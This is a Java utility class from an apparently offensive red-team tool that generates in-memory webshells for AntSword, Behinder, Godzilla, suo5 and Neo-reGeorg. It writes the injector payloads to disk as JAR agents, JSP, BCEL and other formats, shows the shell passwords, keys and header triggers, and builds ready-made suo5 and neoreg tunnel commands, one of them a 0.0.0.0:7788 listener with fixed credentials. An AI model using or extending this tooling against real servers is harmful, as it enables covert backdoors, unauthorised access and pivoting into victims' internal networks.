package com.potato.potatotool.content.redTeam.memshell.util;


import com.potato.potatotool.content.redTeam.payload.PayloadFormat;
import com.potato.potatotool.content.redTeam.payload.PayloadOutputPathResolver;
import com.potato.potatotool.content.redTeam.payload.PayloadOutputRequest;
import com.potato.potatotool.content.redTeam.payload.PayloadOutputResult;
import com.potato.potatotool.content.redTeam.payload.PayloadOutputService;
import com.potato.potatotool.content.redTeam.memshell.config.MemoryObj;
import com.potato.potatotool.content.redTeam.memshell.config.MemoryShellConstants;
import com.potato.potatotool.utils.core.I18nUtils;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.LinkedHashMap;
import java.util.Map;

/**
 * @author Potato
 * @date 2024/7/29 15:52
 */
public class ShowResultsUtil {

    public static Map<String, String> generateShowResultMap(MemoryObj memoryObj) throws Exception {
        Map<String, String> resultMap = new LinkedHashMap<>();
        switch (memoryObj.getToolType()) {
            case MemoryShellConstants.TOOL_ANTSWORD:
                resultMap.put(label("memshell.result.password"), memoryObj.getPass());
                resultMap.put(label("memshell.result.urlpattern"), memoryObj.getUrlPattern());
                resultMap.put(label("memshell.result.header"), memoryObj.getHeaderName() + ": " + memoryObj.getHeaderValue());
                resultMap.put(label("memshell.result.script"), "JSP");
                break;
            case MemoryShellConstants.TOOL_BEHINDER:
                resultMap.put(label("memshell.result.password"), memoryObj.getPass());
                resultMap.put(label("memshell.result.urlpattern"), memoryObj.getUrlPattern());
                resultMap.put(label("memshell.result.header"), memoryObj.getHeaderName() + ": " + memoryObj.getHeaderValue());
                resultMap.put(label("memshell.result.script"), "JSP");
                resultMap.put(label("memshell.result.shellclass"), memoryObj.getShellClassName());
                resultMap.put(label("memshell.result.injectorclass"), memoryObj.getInjectorClassName());
                break;
            case MemoryShellConstants.TOOL_GODZILLA:
                resultMap.put(label("memshell.result.encoder"), "JAVA_AES_BASE64");
                resultMap.put(label("memshell.result.password"), memoryObj.getPass());
                resultMap.put(label("memshell.result.key"), memoryObj.getKey());
                resultMap.put(label("memshell.result.urlpattern"), memoryObj.getUrlPattern());
                resultMap.put(label("memshell.result.header"), memoryObj.getHeaderName() + ": " + memoryObj.getHeaderValue());
                resultMap.put(label("memshell.result.script"), "JSP");
                break;
            case MemoryShellConstants.TOOL_SUO5:
                resultMap.put(label("memshell.result.urlpattern"), memoryObj.getUrlPattern());
                resultMap.put(label("memshell.result.command"), getSuo5ConnectionCommand(memoryObj));
                break;
            case MemoryShellConstants.TOOL_NEOREGEORG:
                resultMap.put(label("memshell.result.key"), memoryObj.getKey());
                resultMap.put(label("memshell.result.urlpattern"), memoryObj.getUrlPattern());
                resultMap.put(label("memshell.result.command"), getNeoreGeorgConnectionCommand(memoryObj));
                break;
            case MemoryShellConstants.TOOL_CUSTOM:
                break;
            default:
                throw new IllegalArgumentException("Unsupported tool type: " + memoryObj.getToolType());
        }

        if (memoryObj.getExprEncoder() != null) {
            String[] results = JexprUtil.generateExp(memoryObj);
                resultMap.put(label("memshell.result.expression"), String.join("", results));
        } else {
            switch (memoryObj.getOutputFormat()) {
                case MemoryShellConstants.OUTPUTFORMAT_JAR_AGENT:
                    memoryObj.setSavePath(getOutputFilePath(memoryObj.getOutputFormat(), memoryObj.getInjectorSimpleClassName(), memoryObj.getSavePath()));
                    Files.write(new File(memoryObj.getSavePath()).toPath(), FormatUtil.JARAgentFormat(memoryObj.getInjectorBytes(), memoryObj));
                    resultMap.put(label("memshell.result.filepath"), memoryObj.getSavePath());
                    break;
                default:
                    PayloadOutputResult payloadOutputResult = transformOutputFormat(memoryObj);
                    if (payloadOutputResult.isFileOutput()) {
                        memoryObj.setSavePath(payloadOutputResult.getFilePath());
                        resultMap.put(label("memshell.result.filepath"), payloadOutputResult.getFilePath());
                    } else {
                        resultMap.put(label("memshell.result.output"), new String(payloadOutputResult.getBytes(), StandardCharsets.UTF_8));
                    }
                    break;
            }
        }

        return resultMap;
    }

    private static String label(String key) {
        return I18nUtils.getString(key);
    }

    /**
     * 根据格式类型、类的简单名称和输出路径，生成文件的输出路径。
     *
     * @param formatType     文件格式类型
     * @param className      类的简单名称
     * @param outputPath     输出路径
     * @return 生成的文件输出路径
     */
    public static String getOutputFilePath(String formatType, String className, String outputPath) throws IOException {
        PayloadFormat payloadFormat = MemoryShellConstants.OUTPUTFORMAT_JAR_AGENT.equals(formatType)
                ? PayloadFormat.JAR
                : toPayloadFormat(formatType);
        return PayloadOutputPathResolver.getOutputFilePath(payloadFormat, className, outputPath);
    }

    // 获取字节码并转换格式
    private static PayloadOutputResult transformOutputFormat(MemoryObj memoryObj) throws Exception{
        byte[] classBytes = memoryObj.getInjectorBytes();
        if (classBytes == null || classBytes.length == 0) {
            throw new IllegalStateException("Injector bytes are empty");
        }
        PayloadFormat payloadFormat = toPayloadFormat(memoryObj.getOutputFormat());
        String outputPath = memoryObj.getSavePath();
        if (PayloadOutputService.isFileFormat(payloadFormat) && (outputPath == null || outputPath.trim().isEmpty())) {
            outputPath = ".";
        }
        return PayloadOutputService.format(PayloadOutputRequest.builder(classBytes, payloadFormat)
                .className(memoryObj.getInjectorClassName())
                .loaderClassName(memoryObj.getLoaderClassName())
                .outputPath(outputPath)
                .build());
    }

    private static PayloadFormat toPayloadFormat(String formatType) {
        if (MemoryShellConstants.OUTPUTFORMAT_CLASS.equals(formatType)) return PayloadFormat.CLASS;
        if (MemoryShellConstants.OUTPUTFORMAT_BCEL.equals(formatType)) return PayloadFormat.BCEL;
        if (MemoryShellConstants.OUTPUTFORMAT_JSP.equals(formatType)) return PayloadFormat.JSP;
        if (MemoryShellConstants.OUTPUTFORMAT_JAR.equals(formatType)) return PayloadFormat.JAR;
        if (MemoryShellConstants.OUTPUTFORMAT_JS.equals(formatType)) return PayloadFormat.JS;
        if (MemoryShellConstants.OUTPUTFORMAT_BASE64.equals(formatType)) return PayloadFormat.BASE64;
        if (MemoryShellConstants.OUTPUTFORMAT_BIGINTEGER.equals(formatType)) return PayloadFormat.BIGINTEGER;
        throw new IllegalArgumentException("Unsupported output format: " + formatType);
    }

    private static String getSuo5ConnectionCommand(MemoryObj memoryObj) {
        String headerValue = shellSingleQuote(memoryObj.getHeaderValue());
        if (memoryObj.getHeaderName().equalsIgnoreCase("user-agent")) {
            return "./suo5 -d --ua " + headerValue + " -t http://\n" +
                    "./suo5 -d -l 0.0.0.0:7788 --auth test:test123 --ua " + headerValue + " -t http://";
        } else {
            String header = shellSingleQuote(memoryObj.getHeaderName() + ": " + memoryObj.getHeaderValue());
            return "./suo5 -H " + header + " -t http://\n" +
                    "./suo5 -l 0.0.0.0:7788 --auth test:test123 -H " + header + " -t http://";
        }
    }

    private static String getNeoreGeorgConnectionCommand(MemoryObj memoryObj) {
        String key = shellSingleQuote(memoryObj.getKey());
        String header = shellSingleQuote(memoryObj.getHeaderName() + ":" + memoryObj.getHeaderValue());
        return "python3 neoreg.py -k " + key + " -H " + header + " -u http://\n" +
                "python3 neoreg.py --skip --proxy http://127.0.0.1:8080 -vv -k " + key + " -H " + header + " -u http://";
    }

    private static String shellSingleQuote(String value) {
        if (value == null) {
            value = "";
        }
        return "'" + value.replace("'", "'\"'\"'") + "'";
    }

}
